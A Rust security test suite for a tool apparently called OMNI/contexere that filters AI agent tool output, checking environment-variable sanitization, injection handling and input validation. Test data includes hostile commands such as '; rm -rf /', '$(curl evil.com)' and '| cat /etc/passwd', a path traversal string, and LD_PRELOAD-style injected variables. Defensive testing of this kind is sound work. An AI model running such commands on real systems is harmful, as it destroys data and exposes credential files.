/// Security tests, verify OMNI does not introduce attack vectors.
use contexere::pipeline::scorer;

fn run_pipeline(input: &str) -> String {
    let segments = scorer::score_with_command(input, "", None);
    contexere::distillers::distill_with_command(&segments, input, "", None)
}

#[test]
fn test_env_sanitization_denylist() {
    use contexere::guard::env::{DENYLIST, sanitize_vars};

    // Set some dangerous env vars in a mock environment
    let mut mock_env: Vec<(String, String)> = Vec::new();
    for var in DENYLIST.iter().take(3) {
        mock_env.push((var.to_string(), "INJECTED_VALUE".to_string()));
    }

    let sanitized = sanitize_vars(mock_env);

    // Verify denylist vars are NOT in sanitized output
    for var in DENYLIST {
        assert!(
            !sanitized.iter().any(|(k, _)| k.eq_ignore_ascii_case(var)),
            "Denylist variable {} should be removed by sanitize_vars",
            var
        );
    }
}

#[test]
fn test_hook_does_not_execute_shell_strings() {
    // Input containing shell injection attempts
    let malicious_inputs = vec![
        "; rm -rf /",
        "$(curl evil.com)",
        "`whoami`",
        "| cat /etc/passwd",
        "&& shutdown -h now",
        "'; DROP TABLE sessions; --",
    ];

    for input in malicious_inputs {
        let output = run_pipeline(input);
        // Pipeline should treat these as plain text, never execute them
        // Output should just be the text itself (passthrough for short content)
        assert!(
            !output.is_empty() || input.trim().is_empty(),
            "Malicious input should be handled as text, not executed: {}",
            input
        );
    }
}

#[test]
fn test_pipeline_handles_null_bytes() {
    let input = "normal text\x00with null\x00bytes";
    let output = run_pipeline(input);
    // Should not crash, output should be non-empty
    assert!(!output.is_empty());
}

#[test]
fn test_pipeline_handles_extremely_long_lines() {
    let long_line = "a".repeat(100_000);
    let output = run_pipeline(&long_line);
    // Should not crash and should produce some output
    assert!(!output.is_empty());
}

#[test]
fn test_pipeline_handles_unicode_edge_cases() {
    let inputs = vec![
        "こんにちは世界",
        "🔥💀🎉 emoji lines\n🚀 rocket",
        "mixed مرحبا 你好 Привет",
        "\u{FEFF}BOM at start", // BOM character
        "line1\r\nwindows\r\nnewlines\r\n",
    ];

    for input in inputs {
        let output = run_pipeline(input);
        assert!(
            !output.is_empty(),
            "Unicode input should not crash pipeline: {:?}",
            &input[..input.len().min(30)]
        );
    }
}

#[test]
fn test_pipeline_deterministic() {
    let input =
        std::fs::read_to_string("tests/fixtures/git_diff_multi_file.txt").expect("fixture missing");

    let output1 = run_pipeline(&input);
    let output2 = run_pipeline(&input);

    assert_eq!(
        output1, output2,
        "Pipeline should be deterministic for same input"
    );
}

#[test]
fn test_env_sanitization_removes_dangerous_vars() {
    use contexere::guard::env::{DENYLIST, sanitize_vars};

    // Set beberapa dangerous vars in a mock env
    let mock_env = vec![
        ("LD_PRELOAD".to_string(), "malicious.so".to_string()),
        ("BASH_ENV".to_string(), "evil_script.sh".to_string()),
        ("NODE_OPTIONS".to_string(), "--require=evil".to_string()),
        ("PATH".to_string(), "/usr/bin:/bin".to_string()),
    ];

    let sanitized = sanitize_vars(mock_env);

    // Verify semua DENYLIST entries hilang
    for key in DENYLIST {
        assert!(
            !sanitized.iter().any(|(k, _)| k.eq_ignore_ascii_case(key)),
            "DENYLIST entry '{}' should not be in sanitized env",
            key
        );
    }

    // Verify normal vars masih ada
    assert!(
        sanitized.iter().any(|(k, _)| k.to_uppercase() == "PATH"),
        "PATH should still be in sanitized env"
    );
}

#[test]
fn test_hook_handles_null_bytes_gracefully() {
    use contexere::hooks::post_tool::process_payload;

    // Input dengan null bytes not boleh crash
    let malicious = "{\"tool_name\":\"Bash\",\"tool_response\":{\"content\":\"hello\0world\"}}";
    let result = process_payload(malicious, None, None);
    // not crash adalah acceptance criteria, result bisa None atau Some
    let _ = result;
}

#[test]
fn test_dispatcher_catch_unwind_works() {
    // Test bahwa panic di dalam handler not propagate
    // Kita simulasi behavior catch_unwind di dispatcher.rs
    let result = std::panic::catch_unwind(|| {
        panic!("intentional panic for test");
    });

    assert!(result.is_err(), "Should have caught the panic");

    // Verifikasi dispatcher::run behavior (fail silently)
    let dispatcher_behavior = match result {
        Ok(_) => "should_not_happen",
        Err(_) => "caught_and_handled",
    };
    assert_eq!(dispatcher_behavior, "caught_and_handled");
}

#[test]
fn test_hook_json_escaping_quotes_and_newlines() {
    use contexere::hooks::post_tool::process_payload;
    use serde_json::json;

    // Input dengan quotes dan newlines dalam content
    let tricky_content = "error: expected `\"` \nfound `\n` at line 42".repeat(30);
    let input = json!({
        "tool_name": "Bash",
        "tool_input": {"command": "cargo build"},
        "tool_response": {"content": tricky_content}
    });

    if let Some(output) = process_payload(&input.to_string(), None, None) {
        // Output should be valid JSON
        let parsed: serde_json::Value = serde_json::from_str(&output)
            .expect("Hook output must be valid JSON even with special chars");
        // #158: `updatedToolOutput`, not `updatedResponse`, this assertion used
        // to hold the wrong key in place, passing happily while the host ignored
        // every replacement OMNI produced.
        assert!(parsed["hookSpecificOutput"]["updatedToolOutput"]["result"].is_string());
        assert_eq!(
            parsed["hookSpecificOutput"]["updatedToolOutput"]["status"],
            "success"
        );
    }
}

// ─── L4-02: Loop Context Security Tests ──────────────────────

#[test]
fn test_loop_id_injection_rejected() {
    use contexere::guard::env::{ValidationError, validate_loop_context};

    // Shell metacharacters in loop_id
    assert_eq!(
        validate_loop_context(Some("abc;rm -rf /"), None, None),
        Err(ValidationError::InvalidLoopId)
    );

    // Path traversal attempt
    assert_eq!(
        validate_loop_context(Some("../../../etc/passwd"), None, None),
        Err(ValidationError::InvalidLoopId)
    );

    // Too long (65 chars)
    let long_id = "a".repeat(65);
    assert_eq!(
        validate_loop_context(Some(&long_id), None, None),
        Err(ValidationError::InvalidLoopId)
    );

    // Valid IDs pass
    assert!(validate_loop_context(Some("abc-123-def"), None, None).is_ok());
    assert!(validate_loop_context(Some("loop42"), None, None).is_ok());
    // Max length (64 chars) passes
    let max_id = "a".repeat(64);
    assert!(validate_loop_context(Some(&max_id), None, None).is_ok());
}

#[test]
fn test_goal_shell_metachar_sanitized() {
    use contexere::guard::env::{ValidationError, validate_loop_context};

    let dangerous_goals = vec![
        "fix this; echo pwned",
        "fix $(whoami)",
        "fix `id`",
        "fix | cat /etc/passwd",
        "fix & background",
        "fix > /dev/null",
        "fix < input.txt",
        "fix (subshell)",
        "fix ) close",
    ];

    for goal in dangerous_goals {
        assert_eq!(
            validate_loop_context(None, Some(goal), None),
            Err(ValidationError::GoalContainsShellMetachars),
            "Goal '{}' should be rejected",
            goal
        );
    }

    // Clean goals pass
    assert!(validate_loop_context(None, Some("fix the auth tests"), None).is_ok());
    assert!(validate_loop_context(None, Some("implement feature-123"), None).is_ok());
}

#[test]
fn test_goal_too_long_rejected() {
    use contexere::guard::env::{ValidationError, validate_loop_context};

    let long_goal = "a".repeat(501);
    assert_eq!(
        validate_loop_context(None, Some(&long_goal), None),
        Err(ValidationError::GoalTooLong)
    );

    // Exactly 500 passes
    let max_goal = "a".repeat(500);
    assert!(validate_loop_context(None, Some(&max_goal), None).is_ok());
}

#[test]
fn test_budget_overflow_clamped() {
    use contexere::guard::env::{ValidationError, validate_loop_context};

    assert_eq!(
        validate_loop_context(None, None, Some(10_000_001)),
        Err(ValidationError::BudgetTooLarge)
    );

    // u64 overflow attempt
    assert_eq!(
        validate_loop_context(None, None, Some(u64::MAX)),
        Err(ValidationError::BudgetTooLarge)
    );

    // Max valid budget passes
    assert!(validate_loop_context(None, None, Some(10_000_000)).is_ok());

    // Zero budget is fine
    assert!(validate_loop_context(None, None, Some(0)).is_ok());
    assert!(validate_loop_context(None, None, None).is_ok());
}

#[test]
fn test_malicious_mcp_params_rejected() {
    use contexere::guard::env::validate_loop_context;

    // Combined attack: all fields malicious
    assert!(
        validate_loop_context(
            Some(";drop table"),
            Some("$(curl evil.com)"),
            Some(u64::MAX)
        )
        .is_err()
    );

    // All fields valid
    assert!(
        validate_loop_context(Some("valid-loop-id"), Some("fix the tests"), Some(100_000)).is_ok()
    );
}
